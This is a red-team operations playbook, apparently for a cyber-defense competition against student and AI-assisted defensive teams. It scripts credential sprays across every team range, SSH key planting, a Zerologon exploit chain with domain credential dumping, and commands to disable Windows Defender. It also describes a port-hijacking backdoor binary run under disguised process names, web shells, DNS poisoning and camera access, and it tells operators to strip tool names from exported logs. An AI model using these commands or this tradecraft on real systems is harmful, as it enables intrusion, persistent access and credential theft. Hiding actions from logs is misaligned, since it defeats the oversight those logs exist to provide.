# Private Playbook — Engagement-Specific Intelligence
# PRIVATE — NOT FOR EXPORT. Excluded from /blue-team-handoff by policy.
# Do NOT echo specific tool names, techniques, or variants to OPERATION-LOG.md or any exported file.
# Log to exported files at the educational abstraction level only (e.g., "DLL hijack persistence deployed").

---

## Quals Environment Carry-Over Intelligence

**What we know:** Engagement cloud infrastructure is reported to be the same environment used at the qualifying event (Pattern A). This gives us pre-engagement recon-equivalent data — but it is UNVERIFIED until we confirm it ourselves.

**Risk of over-reliance:** If the environment differs (different base image, additional hardening, different IP scheme), quals-derived assumptions will lead to wasted time chasing wrong addresses. Treat quals intel as HIGH-CONFIDENCE HYPOTHESIS, not ground truth. Every assumption below has a verification step and a fallback.

**Verification gate (run during pre-engagement access window, Test Group Zero):**
```bash
# Step 1: Confirm IP layout matches quals topology
nmap -sV -p 22,80,389,443,445,3389,5000,5985,8080,8082 10.100.100.2-240 --exclude 10.100.100.1,10.100.100.3 -oN /tmp/teamzero-services.txt

# Step 2: Check MAC prefix on .2 host (bc:24:11: = Proxmox = same infrastructure)
nmap -sn 10.100.100.0/24 --exclude 10.100.100.1,10.100.100.3 -oN /tmp/teamzero-arp.txt

# Step 3: Check domain name visible in LDAP/SMB banner on .14
nmap -p 389,445 --script ldap-rootdse,smb2-security-mode 10.100.100.14 -oN /tmp/teamzero-dc.txt
```

**Confirmation criteria (ALL three should match to trust quals intel):**
- `.14` answers on 389, 445, 5985 → DC is at `.14` ✓
- `.20` answers on 80 with WordPress login page → app server at `.20` ✓
- `.2` shows `bc:24:11:` MAC → same Proxmox images ✓
- Domain in LDAP banner = `rmwpra.hydration` → same base image, quals credentials likely valid ✓

**If ANY check fails:** assume quals intel is NOT applicable. Run full Phase 1 recon before committing to any specific IPs or credentials.

**Assumed group IP scheme (UNVERIFIED — confirm at engagement start):**
- Group 0 = 10.100.100.0/24 (test range, not an engagement target)
- Group 1 = 10.100.101.0/24 ... Group 9 = 10.100.109.0/24
- Groups 1–8 = student defensive teams; Group 9 = AI-Assisted Defensive Group (if present per engagement-profile.yaml)
- Scoring engine: likely 10.2.1.5 (same as Pattern A PCAP)
- **Update this if actual group assignments differ at engagement start**

---

### Pre-Staged Phase 1 Commands (Quals-Topology Version)

**USE ONLY IF quals verification passes.** If verification fails, use standard scan-then-spray approach.

These commands assume teams at `10.100.10N.0/24` for N in 1–9. Substitute actual team ranges if different.

**STEP 0 — Verify assumed topology on first team before running across all (30 seconds):**
```bash
# Quick sanity check: does Team 1 match expected layout?
nmap -sV --open -p 22,80,389,445,5985 10.100.101.2 10.100.101.14 10.100.101.20 10.100.101.22 --max-retries 1 -T4
# Expected: .2=SSH, .14=LDAP/SMB/WinRM, .20=HTTP(WordPress), .22=WinRM
# If these don't match, STOP and run full recon before spraying
```

**STEP 1 — SSH spray across all teams (run first; establishes beachhead):**
```bash
# netexec parallel SSH spray — root:WaterIsWet?? against all .2 hosts
netexec ssh 10.100.101.2 10.100.102.2 10.100.103.2 10.100.104.2 10.100.105.2 10.100.106.2 10.100.107.2 10.100.108.2 10.100.109.2 -u root -p 'WaterIsWet??' --no-bruteforce

# Also spray .240 (management) and secondary servers in parallel
netexec ssh 10.100.101.240 10.100.102.240 10.100.103.240 10.100.104.240 10.100.105.240 10.100.106.240 10.100.107.240 10.100.108.240 10.100.109.240 -u root -p 'WaterIsWet??' --no-bruteforce
```

**STEP 2 — WordPress access (CONFIRMED scoring credential; run in parallel with Step 1):**
```bash
# Test admin:WaterIsWet?? against every team's WordPress — this credential is scoring-locked
for N in 1 2 3 4 5 6 7 8 9; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -c /tmp/wp-t${N}.txt -b "wordpress_test_cookie=WCtest" \
    -X POST "http://10.100.10${N}.20/wordpress/wp-login.php" \
    -d "log=admin&pwd=WaterIsWet%3F%3F&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1")
  echo "Team ${N} WordPress: HTTP ${STATUS}"
done
# 302 = logged in successfully; 200 = failed
```

**STEP 3 — SMB/WinRM spray against DCs (highest value; run immediately after Step 1 shell deploy):**
```bash
# SMB against DCs
netexec smb 10.100.101.14 10.100.102.14 10.100.103.14 10.100.104.14 10.100.105.14 10.100.106.14 10.100.107.14 10.100.108.14 10.100.109.14 -u Administrator -p 'WaterIsWet??' --no-bruteforce

# WinRM against Windows hosts
netexec winrm 10.100.101.22 10.100.102.22 10.100.103.22 10.100.104.22 10.100.105.22 10.100.106.22 10.100.107.22 10.100.108.22 10.100.109.22 -u Administrator -p 'WaterIsWet??' --no-bruteforce
```

**STEP 4 — SSH key deploy on every successful SSH access (5 seconds per host; do immediately):**
```bash
# Replace TEAM_IP with actual IP of successful SSH access
ssh-copy-id -i ~/.ssh/id_ed25519.pub -o StrictHostKeyChecking=no root@TEAM_IP
# Or inline:
ssh root@TEAM_IP 'mkdir -p ~/.ssh && echo "YOUR_PUBKEY" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys'
```

**STEP 5 — Zerologon check on DCs (run after STEP 3; if SMB hit fails and DC is unpatched):**
```bash
# Check Zerologon on each DC
python3 zerologon_tester.py RMWPRA 10.100.10N.14
# If vulnerable:
python3 cve-2020-1472-exploit.py RMWPRA 10.100.10N.14
impacket-secretsdump -no-pass -just-dc rmwpra/RMWPRA\$@10.100.10N.14
```

**STEP 6 — Domain credential spray (after ANY AD foothold; generates full user list):**
```bash
# Enumerate AD users from DC (requires any valid credential or null session)
impacket-GetADUsers -all rmwpra.hydration/Administrator:'WaterIsWet??'@10.100.10N.14

# Or via netexec if SMB access exists
netexec smb 10.100.10N.14 -u Administrator -p 'WaterIsWet??' --users
```

---

### Fallback Plan (if quals topology is NOT confirmed)

Do not assume any specific IPs. Run standard Phase 1:
```bash
# Discover live hosts first
nmap -sn 10.100.10N.0/24 --exclude 10.100.10N.1,10.100.10N.3 -oN /tmp/discovery-tN.txt

# Service scan live hosts
nmap -sV --open -p 22,80,389,443,445,3389,5000,5985,8080,8082 \
  $(grep "Nmap scan report" /tmp/discovery-tN.txt | awk '{print $NF}') \
  --exclude 10.100.10N.1,10.100.10N.3 -oN /tmp/services-tN.txt
```

Then spray Universal Exercise Defaults (below in CREDENTIAL-INTEL.md) against discovered services. Do not spend time on theme-specific passwords until actual service layout is confirmed.

---

## Status of Incoming Items (track before engagement day)

| Item | Owner | Status |
|------|-------|--------|
| Signed executable CA + signing instructions | (person from Discord) | PENDING — details not yet received |
| Pwndrop setup + access details | (person from Discord) | PENDING — details not yet received |
| Realm C2 credentials | Request via Discord | PENDING |
| Cobalt Strike key/access | @rabidvermin | PENDING |
| WatershellX binary (Alpine + FreeBSD builds) | @Khael | PENDING — contact for binary |
| Red Team Wiki restoration | (person from Discord) | IN PROGRESS |
| Kali JB compute + Obsidian Sync | (two people from Discord) | INVESTIGATING |

**Add details here as they arrive. Do not wait until engagement morning.**

---

## C2 / Beacon Deployment

See `coordination/C2-CONFIG.md` for all connection details and callback IP lists.

**Post-initial-access beacon priority:**
1. Deploy Adaptix beacon first (cross-platform, web UI ready, creds in hand)
2. Deploy Realm beacon second (cross-platform, request creds now if not received)
3. Deploy CS beacon on Windows targets when available (most mature post-ex tooling)
4. Route non-beacon tooling through Koutai proxy

**Multiple C2s per host** — deploy at least two where possible. If one is burned, fall back immediately without re-exploiting.

---

## BOFs (Beacon Object Files)

### Adaptix
- Extension Kit is **built into Windows beacons already** — no manual loading required.
- Check the Adaptix web UI for available extensions on beacon connect.

### Cobalt Strike
- **BYOB** — Bring Your Own BOF. No pre-loaded BOF kit provided.
- Load BOFs manually via CS client: `Cobalt Strike > Script Manager > Load`.
- If you have preferred BOFs, stage them on your jumpbox before engagement day.
- Recommended BOF categories to have ready: credential access (e.g., Kerberoast, LSASS), situational awareness (e.g., netstat, whoami extended), lateral movement helpers.

---

## Signed Executables / AV Evasion

**Details pending** — CA and signing instructions being sent.

**When received, update here:**
- CA location / cert file:
- Signing command / tool:
- Targets: Windows payloads requiring signature to bypass SmartScreen / AV

**Interim approach (until signing details arrive):**
- Use Adaptix/CS beacon stagers directly — often sufficient against default Defender configs
- Obfuscate payload delivery where possible (encoded commands, in-memory execution)

---

## WatershellX — Linux Persistence (Primary Linux Tool)

**What it is:** An upgraded watershell binary (C) that establishes a persistent shell accessible via any port — UDP or TCP — including ports running scored services. Blue teams cannot kill access with network firewalling alone; they must find and kill the binary.

**Key capability over original watershell:**
- Listens on every UDP and TCP port by default (not just one port)
- Parses raw TCP frames, so it intercepts traffic destined for legitimate services (e.g., HTTP on port 80) without that service being firewalled off
- This means a scored web server on TCP 80 is simultaneously a backdoor while the binary is running
- Network-level firewall rules that block non-service ports (the usual watershell counter) do not help

**Supported targets:** Standard Linux (glibc), Alpine Linux, FreeBSD
- Get Alpine and FreeBSD builds from @Khael before engagement day

**CLI flags:**
- `-c` — run command via runcap (captured output)
- `--nocap` — run command via fork/exec (no output capture)
- `-p` — promiscuous mode: respond to broadcast frames (normally responds only to frames with matching DST IP; promiscuous allows broadcast but risks responding to other machines' commands depending on network layout — use with caution)

**Deployment via Zenith (management C2):**
- Zenith is a companion tool that manages multiple WatershellX sessions from a single interface
- Sweep function: tries random UDP port first, then scans top 10 TCP ports for alive ones, then falls back to TCP PSH/ACK
- Once hosts are swept, select any set and run commands via UDP or TCP with optional port specification
- Contact @Khael for Zenith access

**Deployment via mass script:**
- Can be integrated into the team's existing "tomes" mass-deployment scripts
- Coordinate with @bricey for integration — she offered to slot it in for mass runs
- Manual fallback: `mass-water.sh` style script (push binary, chmod +x, execute in background)

**Operational notes:**
- Deploy as early as possible — priority is getting the binary running before defensive team locks down
- Run as root for full raw socket access; non-root may limit some capabilities
- Use a system-blending name for the process (e.g., named after a real service binary)
- Blue team counter is binary detection (ps, lsof, netstat) or hash-based AV — not firewall rules
- Combine with a C2 beacon as primary and WatershellX as secondary/fallback persistence layer

**Log to OPERATION-LOG.md as:** "Persistence binary deployed on [host]" — no tool name in exported logs.

---

## Persistence Techniques

### DLL Hijacking (Best-effort — evaluate per-target)
- Being investigated; may not be ready for all targets by engagement day.
- When viable: identify service/app with unquoted DLL search path, drop malicious DLL in writable path ahead of the legitimate one.
- Combine with signed binaries (once CA received) for stealth.
- Log to OPERATION-LOG.md as: "DLL hijack persistence deployed on [host]" — no technique specifics.

### Standard Persistence (always available)
- Scheduled tasks (Windows) — blend into existing task naming conventions
- Cron jobs (Linux) — use system-looking paths/names
- SSH authorized_keys (Linux) — silent, survives most defensive team responses
- Registry Run keys (Windows) — high defensive team visibility; use only if task scheduler unavailable
- Web shells — deploy on any accessible web service as backup persistence
- CS/Adaptix/Realm beacon itself — the C2 beacon is primary persistence; layer secondary mechanisms

---

## Defender Evasion

**No confirmed evasion techniques currently in hand** (as of 2026-03-24 meeting).

**Planned approach if no evasion is available before engagement:**
- Attempt to kill/disable Defender on a schedule (task or service disable after initial access)
- `Set-MpPreference -DisableRealtimeMonitoring $true` (requires admin)
- `Stop-Service -Name WinDefend -Force` + `Set-Service -Name WinDefend -StartupType Disabled`
- Use `sc stop WinDefend` / `sc config WinDefend start= disabled` from cmd if PowerShell is constrained
- If any operator finds a working evasion during engagement, share immediately via team channel

**If evasion is shared before engagement day, document here.**

---

## Payload Delivery

### Pwndrop (details pending)
- Hosted file server for payload staging and delivery.
- Details being set up by team member; will be sent before engagement.
- **When received, add here:** URL, credentials, upload procedure.

**Interim:** Stage payloads directly on jumpbox, serve via `python3 -m http.server` on a non-standard port if needed.

---

## Scoring Submission Workflow

See `coordination/SCORING-FORM.md` for the full schema and point values.

**Before engagement start:**
- Create IP pools at `/scoring/red-team/ip-pools/create/` for each C2 (CS, Realm, Adaptix, Koutai)
- Bookmark `/scoring/red-team/` for fast submissions during ops

**Screenshot evidence — one per team, taken immediately:**
Engagement organizers and reviewers routinely require screenshot proof. One screenshot does not cover all teams — each team that a finding applies to needs its own screenshot showing that team's host. If you root 12 teams with the same technique, you need 12 screenshots. Take them the moment you get the shell/dump/file — do not wait.

Every screenshot must show: hostname or IP (in the prompt or command output) + the outcome. Use this one-liner to satisfy most requirements in a single shot:
```
whoami && hostname && ip addr show | grep "inet " | head -5
```

Name files: `teamN_technique_HHMM.png` so you can match them to teams at submission time.

**Evidence to capture per event type:**
- Initial access: `whoami && hostname && ip addr` in shell
- Privesc: before (`whoami` as user) + after (`whoami` as root/admin) — two screenshots per team
- Credential harvest: visible dump output with hostname in prompt (SAM, LSASS, /etc/shadow)
- Sensitive file / PII / CC: file content with path and hostname visible
- Persistence confirmed: mechanism visible (task list, crontab -l, reg query output) with hostname

**Submission batching:**
- One submission per technique, all teams checked, all per-team screenshots uploaded at once
- 20 file limit per submission — 15 teams + a few extras is fine
- Submit as soon as you have a batch ready; don't hold until end of day (Gold Team may not review late submissions in time to affect scoring)

**Highest-value outcome stacks per submission:**
- Root + Privesc + Creds + PII = -450 per team
- Root + Creds = -150 per team (fast baseline to submit while continuing ops)

---

## Operational Tempo and Team Philosophy

**Pace:** Aggressive. The red team lead expects fast initial spread — get into as many boxes across as many teams as possible in the opening window. Speed over stealth until presence is established.

**Beacon-first doctrine:** After initial access on any box, first priority is deploying C2 beacons (Adaptix → Realm → CS priority order). This converts a single operator's access into shared team access immediately. Other operators can then pivot from the beacon without re-exploiting.

**Share everything useful:** Drop discoveries (creds, access paths, pivot points) into coordination files as you go so the rest of the team can exploit them. Do not sit on access. The goal is the whole team benefiting from every foothold.

**Engagement scoring objective:** Ensure sustained pressure across all target groups throughout the engagement — not just the opening window — to maximize assessment value and scoring.

---

## Obsidian Coordination

An Obsidian server is typically running on the jumpbox for shared real-time red team notes during engagement. Check for it at session start — it complements the coordination files in this repo with freeform notes and shared context across operators.

---

## High-Value Technique: Zerologon (CVE-2020-1472)

Zerologon has appeared repeatedly in exercise environments and reliably trips up defensive teams who haven't patched it. Prioritize this against any Windows DC that doesn't have the patch applied.

**What it does:** Exploits a flaw in the Netlogon secure channel protocol to set the DC computer account password to empty, granting full domain compromise without any credentials.

**When to use:** After initial recon identifies a Windows DC. Test before wasting time on credential spray if the DC version suggests it's unpatched (Server 2016/2019 without August 2020+ patches).

**Impacket one-liner (via proxychains if routing through Koutai):**
```
proxychains python3 zerologon_tester.py <DC_NETBIOS_NAME> <DC_IP>
# If vulnerable:
proxychains python3 cve-2020-1472-exploit.py <DC_NETBIOS_NAME> <DC_IP>
# Then secretsdump with empty password:
proxychains secretsdump.py -no-pass -just-dc <DOMAIN>/<DC_NETBIOS_NAME>\$@<DC_IP>
```

**Post-exploit:** Full domain credential dump. Feed everything into CREDENTIALS.md and pivot to every domain-joined box.

**Restore machine account password after dump** — if engagement infrastructure requires the DC to remain functional for scoring, restore the original password hash using the secretsdump output. Ask PERSIST-001 if unclear.

**Log to OPERATION-LOG.md as:** "Domain controller compromised via known vulnerability; full credential dump obtained."

---

## High-Value Technique: DNS Manipulation

Historically disruptive in exercise environments — if the red team controls a DC or has write access to DNS, poisoning/modifying DNS records trips up defensive teams significantly:

- **Redirect service records:** Point critical internal hostnames to red team-controlled IPs to intercept credentials and traffic
- **Delete records:** Breaks dependent services, creates defensive team confusion, and often scores points as service degradation
- **Create forwarder:** Add a conditional forwarder pointing internal zones to red team DNS for passive credential capture
- **Modify MX records:** Redirect internal mail to capture credentials from webmail workflows

**Requires:** DC access or DNS admin credentials. Pair with Zerologon for immediate DNS admin access after DC compromise.

**Caution:** DNS changes can be broadly disruptive — coordinate with team before making changes that would affect multiple scored services simultaneously.

---

## Special Targets (Engagement Organizer Pre-Disclosure)

The engagement organizers have confirmed the following non-standard elements will be present in the engagement environment. These are sanctioned targets for red team interaction.

### ICS / Industrial Control System
- Unknown ICS type — scout during recon phase
- Common ICS protocols to probe: Modbus/TCP (502), DNP3 (20000), EtherNet/IP (44818), BACnet/IP (47808)
- Common exposed interfaces: web HMI, VNC to operator workstation, Historian web UI
- Default credentials common — see CREDENTIAL-INTEL.md for ICS defaults
- **Goal:** Access the HMI or engineering workstation; screenshot/demonstrate control
- **Constraint:** Do not cause physical damage or permanently alter configurations in ways that would break the scoring environment. Read/screenshot is always safe; write commands require judgment.

### Cameras (Defensive Team Visibility)
- Cameras positioned to observe defensive team workstations or screens
- Likely IP cameras with web interfaces
- **Goal:** Access the RTSP stream or web UI and screenshot defensive team activity — this provides genuine tactical intelligence during engagement (what are they doing, what are they patching)
- Common default creds: admin/admin, admin/12345, admin/password, root/root — see CREDENTIAL-INTEL.md
- Probe on ports 80, 443, 554 (RTSP), 8080, 8554

### Light / Siren (Noise-on-Compromise)
- A physical light/siren that the red team can trigger if they find a control path
- Red team lead wants this activated if/when we find access
- Likely on the same network as the ICS or BMS (building management system)
- May be BACnet-addressable, Modbus-reachable, or accessible via a web interface on the same segment as other OT assets
- **This is explicitly sanctioned and encouraged by the engagement organizers**

---

## Notes on AI-Assisted Defensive Teams

Some engagements include AI-assisted defensive teams. Check `engagement-profile.yaml` field `environment.ai_defensive_team`. If present, assume log correlation and automated remediation are faster than human-only defensive teams.

**Counter-tactics:**
- Vary timing between actions — avoid fixed-interval patterns that trigger behavioral analytics
- Use legitimate admin tools where possible (LOLBins on Windows, built-in Linux utils)
- Minimize unique log signatures — blend into normal service traffic
- Deploy multiple persistence layers before defensive team gets access; assume first layer will be found
- Route traffic through Koutai to avoid IP-based blocking
